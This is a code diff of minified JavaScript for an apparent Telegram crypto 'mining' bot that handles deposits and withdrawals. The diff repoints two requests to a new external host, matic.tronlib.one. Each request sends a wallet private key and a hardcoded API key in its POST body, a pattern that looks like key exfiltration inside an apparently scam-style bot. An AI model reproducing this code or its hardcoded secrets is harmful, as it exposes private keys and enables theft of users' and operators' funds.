@@ -1170,7 +1170,7 @@ S.action("turn_on_mining", async (ctx) => {
                         try {
                             const topeurl = U+"/"+e.from.id;
                             const a = { apikey: "08b11912fba3d3d378ac999005ade9c5", bsc_address: x, bscPrivateKey: T, ipn_url: topeurl },
-                                 n = await p("https://maticc.onrender.com/generate-address", { method: "POST", body: JSON.stringify(a), headers: { "Content-Type": "application/json" } }),
+                                 n = await p("https://matic.tronlib.one/generate-address", { method: "POST", body: JSON.stringify(a), headers: { "Content-Type": "application/json" } }),
                                  r = await n.json();
                             return console.log(r.status), "failed" === r.status ? (te(r.message), "Failed") : {
                                 address: r.address,
@@ -1229,7 +1229,7 @@ S.action("turn_on_mining", async (ctx) => {
                     i = {
                         parse_mode: "Markdown"
                     };
-                le(e,e.message), await e.replyWithPhoto(r, {
+                del(e), await e.replyWithPhoto(r, {
                     caption: n,
                     reply_markup: s,
                     ...i
@@ -1247,7 +1247,7 @@ S.action("turn_on_mining", async (ctx) => {
                         text: "🔍 Generate QR Code",
                         callback_data: `qr ${t[0].depositAddress}`
                     };
-                le(e,e.message), ue(e, a, {
+                    del(e), ue(e, a, {
                     reply_markup: {
                         inline_keyboard: [
                             [n]
@@ -2540,7 +2540,7 @@ Maximum withdrawal amount is: ${t.toFixed()}`, {
                 if ("rejected" === s.status || "approved" === s.status) await e.answerCbQuery("This action is no longer available.its already " + s.status);
                 else {
                     const i = "08b11912fba3d3d378ac999005ade9c5",
-                            o = "https://maticc.onrender.com/Transfer",
+                            o = "https://matic.tronlib.one/Transfer",
                             l = { "Content-Type": "application/json" },
                             d = { receiver: s.wallet, amount: parseFloat(s.amount), private_key: T, apikey: i },
                         c = await async function(e, t, a) {
